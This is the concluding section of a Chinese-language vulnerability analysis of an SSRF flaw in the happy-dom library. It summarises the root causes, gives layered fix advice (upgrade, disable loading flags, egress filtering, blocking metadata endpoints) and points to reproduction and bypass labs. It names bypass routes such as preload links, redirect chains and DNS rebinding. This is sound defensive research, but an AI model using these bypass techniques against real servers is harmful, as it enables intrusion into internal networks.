id=\"sec-96\">七、结论与修复建议</h2><h3 id=\"sec-97\">7.1 一条链，四个结论</h3><p>把前面六章压成一句话：<strong>happy-dom 把浏览器的\"连接即加载\"语义完整地带进了服务端，却没有带上服务端的威胁模型。</strong></p><ul><li><p><strong>默认值即策略。</strong> <code>disableCSSFileLoading</code> / <code>disableIframePageLoading</code> 的 <code>false</code> 就是\"允许加载\"，攻击者不需要应用做错任何事。</p></li><li><p><strong>连接是唯一扳机。</strong> 入口是 <code>page.content</code>、<code>innerHTML</code>、<code>DOMParser</code> 还是别的 API 都不重要，重要的是元素有没有连上（4.1–4.3）。</p></li><li><p><strong>唯一的出口没有策略。</strong> <code>Fetch.sendRequest</code> 只负责发，不判断目标；超时、大小上限、地址校验都不在这一层（4.4–4.5）。</p></li><li><p><strong>响应处置决定危害。</strong> 同一个出口，响应进 CSS 解析器是盲 SSRF，进 <code>frame.content</code> 就能被应用读走（4.6–4.7）。第三章与第五章的两条真实链路，差别只在宿主怎么用这个库。</p></li></ul><h3 id=\"sec-98\">7.2 修复建议：分四层看</h3><p><strong>第一层：库使用者，先升级。</strong> 21.0.0 起两个开关默认关闭，原 CVE 的两条路径不再出网（3.6 节 2 次 → 0 次，5.5 节三组对照 9 项断言全过）。这是成本最低、也最应优先做的一步。</p><p><strong>第二层：暂时升不上去，显式关掉加载。</strong> 在构造 <code>Browser</code> / <code>Window</code> 时把两个开关设为 <code>true</code>：</p><pre><code>const browser = new Browser({\n  settings: {\n    disableCSSFileLoading: true,\n    disableIframePageLoading: true\n  }\n});\n</code></pre><p>但要知道这道防线的边界（4.6.2、4.7.2）：它只关\"加载\"，不做目标校验；<code>srcdoc</code> 在闸门之前仍会渲染；<code>&lt;link rel=\"preload\"&gt;</code> 走的是另一个分支，不在它们的覆盖范围内——这正是第六章方向一的入口。<strong>不要把它当成安全边界，它只是把风险收窄。</strong></p><p><strong>第三层：应用侧，别把过滤放在 href 上。</strong> 如果一定要在应用层设防：</p><ul><li><p>解析前做白名单净化，而不是解析后检查字符串；</p></li><li><p>任何\"只允许相对 / 同源 URL\"的判断，都必须把重定向算进去（6.5.3）——只看 <code>href</code> 的过滤隔着一个 302 就失效；</p></li><li><p>不要在同一个 <code>BrowserContext</code> 里为目标域预置 cookie，否则 <code>crossorigin=\"use-credentials\"</code> 会把盲 GET 升级成带凭据的盲 GET（4.6.2）。</p></li></ul><p><strong>第四层：网络侧，把\"默认拒绝出网\"落到解析进程上。</strong> 这是唯一与库版本无关的兜底：</p><ul><li><p>给解析 / 渲染进程单独的 egress 策略，默认拒绝，只放行必要目标；</p></li><li><p>显式阻断云元数据端点与链路本地网段（<code>169.254.0.0/16</code>、<code>fe80::/10</code>），并优先启用 IMDSv2 这类需要额外请求头的机制；</p></li><li><p>对 DNS 解析后的地址做校验，而不是只校验 URL 字符串——否则重定向与 DNS 重绑定都能绕过（4.5、6.4.3）。</p></li></ul><p>另外，<code>Fetch</code> 提供了 <code>interceptor</code> 作为<strong>唯一可加装的策略点</strong>（4.4）。它默认是 <code>null</code>，但可以在 <code>beforeAsyncRequest</code> 里拿到请求 URL 并直接拒绝或短路。相比之下，<code>disable*</code> 开关是行为开关，<code>X-Frame-Options</code> 只决定内容能否写回（4.7.4），<code>sandbox</code> 连加载行为都不改变（4.7.2）——这三者都不该被当作 SSRF 的防线。</p><h3 id=\"sec-99\">7.4 参考资料</h3><ul><li><p>happy-dom 仓库：<a href=\"https://github.com/capricorn86/happy-dom\">https://github.com/capricorn86/happy-dom</a></p></li><li><p>安全公告 GHSA-c8p4-j97h-3vg8：<a href=\"https://github.com/capricorn86/happy-dom/security/advisories/GHSA-c8p4-j97h-3vg8\">https://github.com/capricorn86/happy-dom/security/advisories/GHSA-c8p4-j97h-3vg8</a></p></li><li><p>happy-dom 21.0.0 发布说明（默认值翻转）：<a href=\"https://github.com/capricorn86/happy-dom/releases\">https://github.com/capricorn86/happy-dom/releases</a></p></li><li><p>本文涉及的复现工程（随文附带，均为本地可执行）：</p><ul><li><p><code>attachments/CVE-2026-118660-repro/</code> —— 第三章的 Docker 靶场（<code>web</code> + <code>intranet</code>，<code>verify.sh</code> 4 项断言）</p></li><li><p><code>attachments/CVE-2026-118660-storybook/</code> —— 第五章的 Storybook + Vitest 测试链（<code>verify.sh</code> 9 项断言）</p></li><li><p><code>attachments/bypass-lab/</code> —— 第六章的两个绕过实验（<code>scheme1-preload-as-fetch</code>、<code>scheme2-redirect-chain</code>）</p></li></ul></li><li><p>文章中用到的所有附件都放到了 <a href=\"https://github.com/0417jinze-glitch/xianzhi_article/tree/main/CVE-2026-118660/attachments\">https://github.com/0417jinze-glitch/xianzhi_article/tree/main/CVE-2026-118660/attachments</a></p></li></ul><blockquote><p>说明：文中所有\"命中 / 未命中\"的判定均以对端服务的请求日志为准；截图与终端输出来自实测环境，版本与命令已在各章标注。</p><p>截图均为终端整窗原图：顶部一行是实际执行的命令，中间是它的全部输出，底部回到提示符；正文里的代码块与截图属于同一次运行的两种呈现，可互相校对。</p><p>随文截图已做脱敏处理：窗口标题栏中的登录信息已擦除，提示符里的账号与主机名统一为 <code>dev@lab</code>；命令、输出与时间戳保持实测原样。</p></blockquote>","original","zhKind","complete","漏洞分析","复现","漏洞利用","容器","https://xz.aliyun.com/news/93265","先知社区",{"_396":397,"_398":-5},"changelogVersion","2026-10-01T08:00","release"]
